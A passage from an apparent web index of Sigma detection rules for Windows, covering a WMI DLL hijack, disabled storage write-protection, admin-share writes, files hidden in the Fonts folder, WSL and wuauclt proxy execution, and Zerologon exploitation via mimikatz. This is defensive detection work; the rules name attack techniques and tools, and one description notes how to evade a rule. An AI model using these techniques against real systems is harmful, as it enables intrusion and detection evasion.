https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html Raw rule (edit) title: Wmiprvse Wbemcomn DLL Hijack id: 7707a579-e0d8-4886-a853-ce47e4575aaa description: Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario. status: experimental date: 2020/10/12 modified: 2021/09/09 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.002 references: - https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html logsource: product: windows category: image_load detection: selection: Image|endswith: \u0026#39;\\wmiprvse.exe\u0026#39; ImageLoaded|endswith: \u0026#39;\\wbem\\wbemcomn.dll\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_wmiprvse_wbemcomn_dll_hijack.yml/","tags":["attack.execution","attack.t1047","attack.lateral_movement","attack.t1021.002"],"title":"Wmiprvse Wbemcomn DLL Hijack"},{"categories":null,"contents":"Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.\nKnown false-positives none observed Raw rule (edit) title: Write Protect For Storage Disabled id: 75f7a0e2-7154-4c4d-9eae-5cdb4e0a5c13 description: Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group. status: experimental author: Sreeman date: 2021/06/11 modified: 2022/03/07 logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - \u0026#39;reg add\u0026#39; - \u0026#39;hklm\\system\\currentcontrolset\\control\u0026#39; - \u0026#39;write protection\u0026#39; - \u0026#39;0\u0026#39; CommandLine|contains: - \u0026#39;storage\u0026#39; - \u0026#39;storagedevicepolicies\u0026#39; condition: selection falsepositives: - none observed level: medium tags: - attack.defense_evasion - attack.t1562 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_write_protect_for_storage_disabled.yml/","tags":["attack.defense_evasion","attack.t1562"],"title":"Write Protect For Storage Disabled"},{"categories":null,"contents":"Aversaries may use to interact with a remote network share using Server Message Block (SMB). This technique is used by post-exploitation frameworks.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md#atomic-test-4---execute-command-writing-output-to-local-admin-share Raw rule (edit) title: Writing Local Admin Share id: 4aafb0fa-bff5-4b9d-b99e-8093e659c65f status: experimental description: | Aversaries may use to interact with a remote network share using Server Message Block (SMB). This technique is used by post-exploitation frameworks. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md#atomic-test-4---execute-command-writing-output-to-local-admin-share date: 2022/01/01 logsource: product: windows category: file_event detection: selection: TargetFilename|contains|all: - \u0026#39;\\\\127.0.0\u0026#39; - \u0026#39;\\ADMIN$\\\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.t1546.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_writing_local_admin_share.yml/","tags":["attack.lateral_movement","attack.t1546.002"],"title":"Writing Local Admin Share"},{"categories":null,"contents":"Monitors for the hiding possible malicious files in the C:\\Windows\\Fonts\\ location. This folder doesn\u0026rsquo;t require admin privillege to be written and executed from.\nKnown false-positives unknown References https://thedfirreport.com/2020/04/20/sqlserver-or-the-miner-in-the-basement/ Raw rule (edit) title: Writing Of Malicious Files To The Fonts Folder id: ae9b0bd7-8888-4606-b444-0ed7410cb728 description: Monitors for the hiding possible malicious files in the C:\\Windows\\Fonts\\ location. This folder doesn\u0026#39;t require admin privillege to be written and executed from. status: experimental references: - https://thedfirreport.com/2020/04/20/sqlserver-or-the-miner-in-the-basement/ date: 2020/21/04 modified: 2022/03/08 author: Sreeman logsource: product: windows category: process_creation detection: selection_1: CommandLine|contains: - \u0026#39;echo\u0026#39; - \u0026#39;copy\u0026#39; - \u0026#39;type\u0026#39; - \u0026#39;file createnew\u0026#39; - \u0026#39;cacls\u0026#39; selection_2: CommandLine|contains: \u0026#39;C:\\Windows\\Fonts\\\u0026#39; selection_3: CommandLine|contains: - \u0026#39;.sh\u0026#39; - \u0026#39;.exe\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;.bin\u0026#39; - \u0026#39;.bat\u0026#39; - \u0026#39;.cmd\u0026#39; - \u0026#39;.js\u0026#39; - \u0026#39;.msh\u0026#39; - \u0026#39;.reg\u0026#39; - \u0026#39;.scr\u0026#39; - \u0026#39;.ps\u0026#39; - \u0026#39;.vb\u0026#39; - \u0026#39;.jar\u0026#39; - \u0026#39;.pl\u0026#39; - \u0026#39;.inf\u0026#39; - \u0026#39;.cpl\u0026#39; - \u0026#39;.hta\u0026#39; - \u0026#39;.msi\u0026#39; - \u0026#39;.vbs\u0026#39; condition: all of selection_* fields: - CommandLine - ParentProcess - CommandLine falsepositives: - unknown level: medium tags: - attack.t1211 - attack.t1059 - attack.defense_evasion - attack.persistence ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_hiding_malware_in_fonts_folder.yml/","tags":["attack.t1211","attack.t1059","attack.defense_evasion","attack.persistence"],"title":"Writing Of Malicious Files To The Fonts Folder"},{"categories":null,"contents":"Detects Possible usage of Windows Subsystem for Linux (WSL) binary as a LOLBIN\nKnown false-positives Automation and orchestration scripts may use this method execute scripts etc References https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/ Raw rule (edit) title: WSL Execution id: dec44ca7-61ad-493c-bfd7-8819c5faa09b status: test description: Detects Possible usage of Windows Subsystem for Linux (WSL) binary as a LOLBIN author: \u0026#39;oscd.community, Zach Stanford @svch0st\u0026#39; references: - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/ date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\wsl.exe\u0026#39; CommandLine|contains: - \u0026#39; -e \u0026#39; - \u0026#39; --exec \u0026#39; condition: selection falsepositives: - Automation and orchestration scripts may use this method execute scripts etc level: medium tags: - attack.execution - attack.defense_evasion - attack.t1218 - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_wsl_lolbin.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1218","attack.t1202"],"title":"WSL Execution"},{"categories":null,"contents":"Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code and making a network connections. One could easily make the DLL spawn a new process and inject to it to proxy the network connection and bypass this rule.\nKnown false-positives Legitimate use of wuauclt.exe over the network. References https://dtm.uk/wuauclt/ Raw rule (edit) title: Wuauclt Network Connection id: c649a6c7-cd8c-4a78-9c04-000fc76df954 status: test description: Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code and making a network connections. One could easily make the DLL spawn a new process and inject to it to proxy the network connection and bypass this rule. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://dtm.uk/wuauclt/ date: 2020/10/12 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Image|contains: wuauclt condition: selection falsepositives: - Legitimate use of wuauclt.exe over the network. level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_wuauclt_network_connection.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Wuauclt Network Connection"},{"categories":null,"contents":"This rule is designed to detect attempts to exploit Zerologon (CVE-2020-1472) vulnerability using mimikatz zerologon module or other exploits from machine with \u0026ldquo;kali\u0026rdquo; hostname.\nReferences https://www.secura.com/blog/zero-logon https://bi-zone.medium.com/hunting-for-zerologon-f65c61586382 Raw rule (edit) title: Zerologon Exploitation Using Well-known Tools id: 18f37338-b9bd-4117-a039-280c81f7a596 status: stable description: This rule is designed to detect attempts to exploit Zerologon (CVE-2020-1472) vulnerability using mimikatz zerologon module or other exploits from machine with \u0026#34;kali\u0026#34; hostname. references: - https://www.secura.com/blog/zero-logon - https://bi-zone.medium.com/hunting-for-zerologon-f65c61586382 author: \u0026#39;Demyan Sokolin @_drd0c, Teymur Kheirkhabarov @HeirhabarovT, oscd.community\u0026#39; date: 2020/10/13 modified: 2021/05/30 tags: - attack.t1210 - attack.lateral_movement logsource: service: system product: windows detection: selection: EventID: - \u0026#39;5805\u0026#39; - \u0026#39;5723\u0026#39; keywords: - kali - mimikatz condition: selection and keywords level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_possible_zerologon_exploitation_using_wellknown_tools.yml/","tags":["attack.t1210","attack.lateral_movement"],"title":"Zerologon Exploitation Using Well-known Tools"}]